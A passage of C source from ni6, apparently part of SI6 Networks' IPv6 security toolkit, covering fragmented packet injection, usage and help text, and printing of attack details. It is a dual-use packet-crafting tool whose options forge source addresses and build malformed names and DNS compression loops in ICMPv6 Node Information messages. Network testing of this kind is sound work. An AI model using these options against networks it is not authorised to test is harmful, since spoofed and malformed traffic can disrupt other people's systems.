			printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, (LUI) (ptr-buffer));
			exit(EXIT_FAILURE);
		}
	}
	else{
		ptrend= ptr;
		ptr= fragpart;
		fptr = fragbuffer;
		fipv6 = (struct ip6_hdr *) (fragbuffer + idata->linkhsize);
		fptrend = fptr + idata->linkhsize+MIN_IPV6_HLEN+MAX_IPV6_PAYLOAD;
		memcpy(fptr, buffer, fragpart-buffer);
		fptr = fptr + (fragpart-buffer);

		if( (fptr+FRAG_HDR_SIZE)> fptrend){
			puts("Unfragmentable Part is Too Large");
			exit(EXIT_FAILURE);
		}

		memcpy(fptr, (char *) &fraghdr, FRAG_HDR_SIZE);
		fh= (struct ip6_frag *) fptr;
		fh->ip6f_ident=random();
		startoffragment = fptr + FRAG_HDR_SIZE;

		/*
		 * Check that the selected fragment size is not larger than the largest 
		 * fragment size that can be sent
		 */
		if(nfrags <= (fptrend - fptr))
			fragsize=nfrags;
		else
			fragsize= (fptrend-fptr) & IP6F_OFF_MASK;

		m=IP6F_MORE_FRAG;

		while((ptr< ptrend) && m==IP6F_MORE_FRAG){
			fptr= startoffragment;

			if( (ptrend-ptr) <= fragsize){
				fragsize= ptrend-ptr;
				m=0;
			}

			memcpy(fptr, ptr, fragsize);
			fh->ip6f_offlg = (htons(ptr-fragpart) & IP6F_OFF_MASK) | m;
			ptr+=fragsize;
			fptr+=fragsize;

			fipv6->ip6_plen = htons((fptr - fragbuffer) - MIN_IPV6_HLEN - idata->linkhsize);
		
			if((nw=pcap_inject(idata->pfd, fragbuffer, fptr - fragbuffer)) == -1){
				printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
				exit(EXIT_FAILURE);
			}

			if(nw != (fptr- fragbuffer)){
				printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, (LUI) (ptr-buffer));
				exit(EXIT_FAILURE);
					}
		} /* Sending fragments */
	} /* Sending fragmented datagram */

	return 0;
}



/*
 * Function: usage()
 *
 * Prints the syntax of the ni6 tool
 */
void usage(void){
    puts("usage:\n"
	     " ni6 -i INTERFACE [-S LINK_SRC_ADDR | -R] [-D LINK-DST-ADDR] \n"
	     "     [-s SRC_ADDR[/LEN] | -r] [-d DST_ADDR] [-c HOP_LIMIT] [-y FRAG_SIZE]\n"
         "     [-u DST_OPT_HDR_SIZE] [-U DST_OPT_U_HDR_SIZE] [-H HBH_OPT_HDR_SIZE] \n"
	     "     [-P SIZE | -6 IPV6_ADDR | -4 IPV4_ADDR | -n NAME | -N LEN | -x LEN -o TYPE]\n"
	     "     [-Z SIZE] [-e] [-C ICMP6_CODE] [-q NI_QTYPE] [-X NI_FLAGS]\n"
	     "     [-P SIZE | -w IPV6_ADDR | -W IPV4_ADDR | -a NAME | -A LEN | -Q LEN -O TYPE]\n"
	     "     [-E] [-j PREFIX[/LEN]] [-k PREFIX[/LEN]] [-J LINK_ADDR]\n"
	     "     [-K LINK_ADDR] [-b PREFIX[/LEN]] [-g PREFIX[/LEN]] [-B LINK_ADDR]\n"
	     "     [-G LINK_ADDR] [-L | -l] [-z] [-v] [-h]");
}


/*
 * Function: print_help()
 *
 * Prints help information for the ni6 tool
 */
void print_help(void){
	puts(SI6_TOOLKIT);
	puts("ni6: Securty assessment tool for attack vectors based on ICMPv6 NI messages\n");
	usage();
    
	puts("\nOPTIONS:\n"
	     "  --interface, -i            Network interface\n"
	     "  --link-src-address, -S     Link-layer Destination Address\n"
	     "  --link-dst-address, -D     Link-layer Source Address\n"
	     "  --src-address, -s          IPv6 Source Address\n"
	     "  --dst-address, -d          IPv6 Destination Address\n"
	     "  --hop-limit, -c            IPv6 Hop Limit\n"
	     "  --frag-hdr. -y             Fragment Header\n"
	     "  --dst-opt-hdr, -u          Destination Options Header (Fragmentable Part)\n"
	     "  --dst-opt-u-hdr, -U        Destination Options Header (Unfragmentable Part)\n"
	     "  --hbh-opt-hdr, -H          Hop by Hop Options Header\n"
	     "  --payload-size, -P         ICMPv6 NI payload size\n"
	     "  --subject-ipv6. -6         Subject IPv6 Address\n"
	     "  --subject-ipv4, -4         Subject IPv4 address\n"
	     "  --subject-name, -n         Subject Name\n"
	     "  --subject-fname, -N        Forge Subject Name of specific length\n"
	     "  --subject-ename, -x        For (malformed) Subject name of specified length\n"
	     "  --subject-nloop, -o        Subject is a Name with a DNS compression loop\n"
	     "  --max-label-size, -Z       Maximum DNS label size (defaults to 63)\n"
	     "  --sname-slabel, -e         Subject Name is a single-label name\n"
	     "  --code, -C                 ICMPv6 code\n"
	     "  --qtype, -q                ICMPv6 NI Qtype\n"
	     "  --flags, -X                ICMPv6 NI flags\n"
	     "  --data-ipv6, -w            Data IPv6 Address\n"
	     "  --data-ipv4, W             Data IPv4 Address\n"
	     "  --data-name, -a            Data Name\n"
	     "  --data-fname, -A           Forge Data Name of specific length\n"
	     "  --data-ename, -Q           For (malformed) Data Name of specified length\n"
	     "  --data-nloop, -O           Data is a Name with a DNS compression loop\n"
	     "  --dname-slabel, -E         Subject Name is a single-label name\n"
	     "  --block-src, -j            Block IPv6 Source Address prefix\n"
	     "  --block-dst, -k            Block IPv6 Destination Address prefix\n"
	     "  --block-link-src, -J       Block Ethernet Source Address\n"
	     "  --block-link-dst, -K       Block Ethernet Destination Address\n"
	     "  --accept-src, -b           Accept IPv6 Source Addres prefix\n"
	     "  --accept-dst, -g           Accept IPv6 Destination Address prefix\n"
	     "  --accept-link-src, -B      Accept Ethernet Source Address\n"
	     "  --accept-link-dst, -G      Accept Ethernet Destination Address\n"
	     "  --forge-src-addr, -r       Forge IPv6 Source Address\n"
	     "  --forge-link-src-addr, -R  Forge link-layer Source Address\n"
	     "  --loop, -l                 Send periodic ICMPv6 error messages\n"
	     "  --sleep, -z                Pause between sending ICMPv6 messages\n"
	     "  --listen, -L               Listen to incoming traffic\n"
	     "  --help, -h                 Print help for the ni6 tool\n"
	     "  --verbose, -v              Be verbose\n"
	     "\n"
	     " Programmed by Fernando Gont for SI6 Networks <http://www.si6networks.com>\n"
	     " Please send any bug reports to <fgont@si6networks.com>\n"
	);
}



/*
 * Function: print_attack_info()
 *
 * Prints attack details (when the verbose ("-v") option is specified).
 */
 
void print_attack_info(struct iface_data *idata){

	puts( "ni6: Assessment tool for attack vectors based on ICMPv6 NI messages\n");

	if(ether_ntop(&(idata->hsrcaddr), plinkaddr, sizeof(plinkaddr)) == 0){
		puts("ether_ntop(): Error converting address");
		exit(EXIT_FAILURE);
	}

	printf("Ethernet Source Address: %s%s\n", plinkaddr, ((!(idata->hsrcaddr_f))?" (randomized)":""));

	/* 
	   Ethernet Destination Address only used if a IPv6 Destination Address or an
	   Ethernet Destination Address were specified.
	 */
	if(idata->dstaddr_f){
		if(ether_ntop(&(idata->hdstaddr), plinkaddr, sizeof(plinkaddr)) == 0){
			puts("ether_ntop(): Error converting address");
			exit(EXIT_FAILURE);
		}

		printf("Ethernet Destination Address: %s%s\n", plinkaddr, \
					((!idata->hdstaddr_f)?" (automatically selected)":""));
	}

	if(idata->srcaddr_f){
		if(inet_ntop(AF_INET6, &(idata->srcaddr), psrcaddr, sizeof(psrcaddr)) == NULL){
			puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
			exit(EXIT_FAILURE);
		}

		printf("IPv6 Source Address: %s%s\n", psrcaddr, ((srcprefix_f)?" (randomized)":""));
	}
	else{
		if(idata->dstaddr_f){
			if(inet_ntop(AF_INET6, &(idata->srcaddr), psrcaddr, sizeof(psrcaddr)) == NULL){
				puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
				exit(EXIT_FAILURE);
			}

			printf("IPv6 Source Address: %s (automatically selected)\n", psrcaddr);
		}
		else
			puts("IPv6 Source Address: Automatically selected");
	}

	if(idata->dstaddr_f){
		if(inet_ntop(AF_INET6, &(idata->dstaddr), pdstaddr, sizeof(pdstaddr)) == NULL){
			puts("inet_ntop(): Error converting IPv6 Destination Address to presentation format");
			exit(EXIT_FAILURE);
		}

		printf("IPv6 Destination Address: %s\n", pdstaddr);
	}

	printf("IPv6 Hop Limit: %u%s\n", hoplimit, (hoplimit_f)?"":" (randomized)");

	for(i=0; i<ndstoptuhdr; i++)
		printf("Destination Options Header (Unfragmentable part): %u bytes\n", dstoptuhdrlen[i]);

	for(i=0; i<nhbhopthdr; i++)
		printf("Hop by Hop Options Header: %u bytes\n", hbhopthdrlen[i]);

	for(i=0; i<ndstopthdr; i++)
		printf("Destination Options Header: %u bytes\n", dstopthdrlen[i]);

	if(fragh_f)
		printf("Sending each packet in fragments of %u bytes (plus the Unfragmentable part)\n", nfrags);

	if(type==ICMP6_NI_QUERY){
		printf("ICMPv6 NI Query (Type 139)");

		switch(code){
			case 0:
				printf(", Subject is an IPv6 address (Code %u)\n", code);

				if(ipv6addr_f){
					if(inet_ntop(AF_INET6, &ipv6addr, pv6addr, sizeof(pv6addr)) == NULL){
						puts("inet_ntop(): Error converting Subject IPv6 Address to presentation format");
						exit(EXIT_FAILURE);
					}

					printf("Subject IPv6 Address: %s\n", pv6addr);
				}
				break;

			case 1:
				printf(", Subject is a Name (Code %u)\n", code);

				if(name_f){
					printf("Subject Name: %s%s\n", printname, (snameslabel_f)?" (single label name)":"");
				}
				else if(fname_f){
					printf("Subject Name: Forged Name of %u byte%s\n", fnamelen, (fnamelen>1)?"s":"");
				}
				else if(exceedp_f){
					printf("Subject Name: Malformed label of %u byte%s\n", exceedp, (exceedp>1)?"s":"");
				}

				break;

			case 2:
				printf(", Subject is an IPv4 Address (Code %u)\n", code);

				if(ipv4addr_f){
					if(inet_ntop(AF_INET, &ipv4addr, pv6addr, sizeof(pv6addr)) == NULL){
						puts("inet_ntop(): Error converting Subject IPv4 Address to presentation format");
						exit(EXIT_FAILURE);
					}

					printf("Subject IPv4 Address: %s\n", pv6addr);
				}
				break;

			default:
				printf(", Unknown ICMPv6 code (Code %u)\n", code);
				break;
		}

		switch(qtype){
			case NI_QTYPE_NOOP:
				printf("Qtype: NOOP (Qtype %u)\n", qtype);
				break;
			case NI_QTYPE_SUPTYPES:
				printf("Qtype: Subtypes (?) (Qtype %u)\n", qtype);
				break;

			case NI_QTYPE_DNSNAME:
				printf("Qtype: Node Name (Qtype %u)\n", qtype);
				break;

			case NI_QTYPE_NODEADDR:
				printf("Qtype: Node Addresses (Qtype %u)\n", qtype);
				break;

			case NI_QTYPE_IPV4ADDR:
				printf("Qtype: IPv4 Addresses (Qtype %u)\n", qtype);
				break;

			default:
				printf("Qtype: <Unknown> (Qtype %u)\n", qtype);
				break;
		}
	}
	else if(type == ICMP6_NI_REPLY){
		printf("ICMPv6 NI Reply (Type 140)");

		switch(qtype){
			case 0:
				puts(", NOOP (Qtype 0)");

			case 1:
				puts(", Supported Qtypes (Qtype 1)");

			case 2:
				printf(", Data is a Name (Qtype %u)\n", qtype);

				if(named_f){
					printf("Data Name: %s%s\n", printnamed, (snamedslabel_f)?" (single label name)":"");
				}
				else if(fnamed_f){
					printf("Data Name: Forged Name of %u byte%s\n", fnamedlen, (fnamedlen>1)?"s":"");
				}
				else if(exceedpd_f){
					printf("Data Name: Malformed label of %u byte%s\n", exceedp, (exceedp>1)?"s":"");
				}

				break;

			case 3:
				printf(", Data contains IPv6 address(es) (Qtype %u)\n", qtype);

				if(ipv6addrd_f){
					if(inet_ntop(AF_INET6, &ipv6addrd, pv6addr, sizeof(pv6addr)) == NULL){
						puts("inet_ntop(): Error converting Subject IPv6 Address to presentation format");
						exit(EXIT_FAILURE);
					}

					printf("Data IPv6 Address: %s\n", pv6addr);
				}
				break;

			case 4:
				printf(", Data contains IPv4 Address(es) (Qtype %u)\n", qtype);

				if(ipv4addrd_f){
					if(inet_ntop(AF_INET, &ipv4addrd, pv6addr, sizeof(pv6addr)) == NULL){
						puts("inet_ntop(): Error converting Data IPv4 Address to presentation format");
						exit(EXIT_FAILURE);
					}

					printf("Data IPv4 Address: %s\n", pv6addr);
				}
				break;

			default:
				printf(", Unknown ICMPv6 NI Query type (Qtype %u)\n", qtype);
				break;
		}
	}

	if(flags_f || type== ICMP6_NI_QUERY){
		printf("Flags: %s%s%s%s%s%s%s%s\n\n", ((flags & NI_NODEADDR_FLAG_GLOBAL)?"G":""), \
											((flags & NI_NODEADDR_FLAG_SITELOCAL)?"S":""), \
											((flags & NI_NODEADDR_FLAG_LINKLOCAL)?"L":""), \
											((flags & NI_NODEADDR_FLAG_COMPAT)?"C":""),\
											((flags & NI_NODEADDR_FLAG_ALL)?"A":""), \
											((flags & NI_NODEADDR_FLAG_TRUNCATE)?"T":""),\
											((!flags)?"none":""), ((!flags_f)?" (default)":""));
	}
}



